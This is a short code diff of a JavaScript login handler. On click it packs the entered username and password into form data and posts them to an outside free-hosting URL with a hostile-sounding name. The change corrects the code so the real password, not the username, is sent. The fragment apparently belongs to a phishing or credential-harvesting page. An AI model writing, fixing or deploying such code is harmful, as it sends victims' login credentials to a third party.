@@ -9,7 +9,7 @@ if (btn){
     btn.addEventListener("click", function(){
         const data = new FormData();
         data.append("username", username);
-        data.append("password", username);
+        data.append("password", password);
 
 
         const response = fetch("https://fckyou-get.000webhostapp.com/get.php", {
